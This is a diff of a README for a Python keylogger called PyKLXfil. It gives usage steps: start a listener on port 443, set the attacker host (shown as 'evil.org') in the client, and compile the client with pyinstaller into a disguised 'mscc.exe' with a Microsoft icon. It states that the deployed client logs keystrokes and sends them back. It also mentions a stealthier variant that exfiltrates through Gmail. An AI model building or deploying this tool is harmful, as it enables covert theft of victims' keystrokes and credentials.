@@ -14,13 +14,12 @@
   ```
 ## Usage:
 ### Key logging and exfiltration using socket server and client:
+* On the server, start listening on all NICs and on port 443 as background job:
 ```sh
-#start listening on all NICs and on port 443 as background job
 python3 PyKLXfil-Server.py 0.0.0.0 443 &
 ```
-* Compile and obfuscate the python client for a windows machine:
+* For the client, edit PyKLXfil-Client.py and add your server's IP/domain and port then compile and obfuscate the script for a windows machine:
 ```sh
-#Edit PyKLXfil-Client.py and add your server's IP/domain and port
  nano PyKLXfil-Client.py
  #snip...       
  #self.host = 'evil.org'
@@ -36,6 +35,7 @@ python3 PyKLXfil-Server.py 0.0.0.0 443 &
 ```sh
 pyinstaller --onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 -n mscc.exe PyKLXfil-Client.py
 ```
+* Once the client is deployed on a Windows machine it will start key logging and exfiltrate them back to the server.
 ### Key logging and exfiltration using gmail (more stealthy):
 * Compile and obfuscate the python gmail client for a windows machine (stand alone):
 * Note: you will first need to get app password token to be used in the script, a good guide can be found [here](https://towardsdatascience.com/automate-sending-emails-with-gmail-in-python-449cc0c3c317)
